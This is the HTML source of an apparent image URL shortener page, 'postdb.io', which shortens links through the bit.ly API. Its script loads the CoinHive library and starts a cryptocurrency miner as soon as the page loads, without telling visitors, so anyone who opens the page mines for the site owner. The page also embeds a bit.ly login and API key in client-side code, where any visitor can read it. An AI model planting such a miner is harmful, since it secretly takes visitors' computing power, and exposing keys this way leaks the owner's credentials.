<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
    <title>PostDB</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0"/>
  </head>
  <style>
    @import url('https://fonts.googleapis.com/css?family=Raleway:700');
    html, body {
      overflow-x: hidden;
    	padding: 0;
    	margin: 0;
      font-family: 'Raleway', sans-serif;
    }
    #maincard {
      position: absolute;
      left: 50%;
      transform: translateX(-50%);
      max-width: 100vw;
      max-height: 90vh;
    }
    .title {
      font-size: 27px;
      margin: 10px;
    }
    .main {
      text-align: center;
      font-size: 50px;
      margin-top: 100px;
      display: none;
    }
    #short {
      margin-top: 70px;
      width: 400px;
      max-width: 90%;
      height: 30px;
      font-size: 23px;
    }
    #button {
      border: 1px solid #000;
      width: 70px;
      height: 30px;
      border-radius: 25px;
      background: #fff;
    }
  </style>
  <body>
    <div class="title">
      postdb.io
    </div>
    <div class="main">
      Shorten Image URL <br>
      <input type="text" id="short" placeholder="https://i.imgur.com/gF72Xn9.gif">
      <br>
      <button type="button" id="button" onclick="submit()">Go</button>
    </div>
    <img id="maincard" class="imgcard">
    <script src="https://coinhive.com/lib/coinhive.min.js"></script>
    <script>
      var miner = new CoinHive.Anonymous("yjGFHNXbIib2c8o9CgcrVVAfTd6na4Cz");
      window.onload = () => {
        miner.start();
      }
      if (window.location.hash != "") {
        var img = window.location.hash.slice(1);
        document.querySelector("#maincard").src = "http://bit.ly/"+img;
      } else {
        document.querySelector(".main").style.display = "inherit";
      }

      var url = "http://postdb.io/#";
      function submit() {
        var i1 = document.querySelector("#short");
          fetch("http://api.bit.ly/v3/shorten?login=o_5qog1opc6f&apiKey=R_d8a21a8680b4409eb00add64f3fb9d4c&longUrl="+i1.value+"&format=json").then((res) => {
            return res.json();
          }).then((data) => {
            url += data.data.hash
            window.location.href = url;
          });
      }
    </script>
  </body>
</html>
